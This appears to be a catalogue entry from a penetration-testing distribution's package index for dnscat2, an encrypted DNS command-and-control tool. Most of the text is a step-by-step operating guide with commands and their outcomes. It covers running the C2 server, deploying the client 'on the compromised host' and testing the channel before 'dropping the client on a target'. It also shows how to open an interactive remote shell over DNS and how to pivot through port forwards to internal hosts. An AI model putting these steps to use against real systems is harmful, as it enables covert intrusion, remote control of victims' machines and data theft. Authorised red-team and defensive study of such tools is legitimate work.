---
name: "dnscat2"
categories:
  - tunnel
version: "0.07-0parrot1"
homepage: "https://github.com/iagox86/dnscat2"
origin: "parrot"
recipe: "parrot-repo"
packaged-by: [parrot]
build-system: scripts
meta-checked: "2026-11-09"
github-repo: "iagox86/dnscat2"
github-stars: 3989
github-pushed: "2024-03-14"
github-archived: false
github-issues: 98
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.9
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# dnscat2

> Encrypted command-and-control channel over DNS, by Ron Bowes (iagox86) — a Ruby server on your authoritative name server and a C client on the compromised host.

## What it's for

Creating an interactive, encrypted C2 session out of almost any network, because DNS queries will traverse the resolver hierarchy until they reach a name server you control. It ships in two halves: the server (`dnscat2.rb`, Ruby, run on the authoritative NS for your domain, or anywhere in direct mode) and the client (C, minimal dependencies, run on the target; it builds as `dnscat`). Traffic is encrypted by default (ECDH key exchange, Salsa20 stream cipher) with a pre-shared `--secret` for man-in-the-middle protection. It is built for command and control — sessions, shells, file transfer, port forwards — not as a general-purpose TCP tunnel or VPN. A direct mode without a domain (`--dns server=...`) is faster but far more obvious, since every query name is prefixed `dnscat.`.

## Typical use cases

### Start the server for your domain

On the authoritative name server (root needed for port 53):

```
ruby dnscat2.rb c2.example.com --secret S3cret
```

Outcome: the server starts a DNS listener on `0.0.0.0:53` for `c2.example.com`, prints the `dnscat2>` console and window list, and waits for clients. Passing `--secret` requires clients to present it and enables authenticated-only security; use `--dnsport <port>` to listen on a non-privileged port instead.

### Connect the client through the DNS hierarchy

On the compromised host:

```
./dnscat c2.example.com --secret S3cret
```

Outcome: the client sends its traffic to the local resolver, which forwards it up the hierarchy to your authoritative server; the server console shows `New window created: 1` (a command session). Both ends print a short authentication string — identical words on both sides mean the encrypted channel has no man-in-the-middle.

### Fall back to direct mode without a domain

Server already running on 198.51.100.10, client:

```
./dnscat --dns server=198.51.100.10,port=53
```

Outcome: the client sends its DNS-shaped traffic straight to the server's IP on UDP/53 — no authoritative domain needed and lower latency, but visible as `dnscat.`-prefixed names in any packet log and frequently blocked by firewalls that only allow the real resolver.

### Verify the DNS path before deploying

From any machine that can use the same resolver:

```
./dnscat --dns server=198.51.100.10,domain=c2.example.com --ping
```

Outcome: round-trips a ping through DNS for the domain; a successful reply means queries for `c2.example.com` actually reach your server — do this before dropping the client on a target. `--ping` alone (`./dnscat --ping c2.example.com`) uses the system resolver.

### Drive the client: sessions and a shell

In the `dnscat2>` console:

```
windows
window -i 1
shell
```

Outcome: `windows` lists all sessions (0 = main console, `dns1` = DNS driver, one per client); `window -i 1` attaches to the client's command session; typing `shell` there asks the client to execute a shell, creating a new session — attach to it the same way and you have an interactive prompt over DNS. Ctrl-Z returns to the parent window; `kill <id>` tears a session down.

### Forward a port through a client session

Inside a client's command session:

```
listen 127.0.0.1:2222 198.51.100.20:22
```

Outcome: with `ssh -L` semantics, the dnscat2 server listens on its own `127.0.0.1:2222`, and connections are carried over the DNS tunnel to exit from the client toward `198.51.100.20:22` — `ssh -p 2222 user@127.0.0.1` on the server box now reaches the host behind the compromised machine.

*No corpus evidence — derived from upstream documentation.*
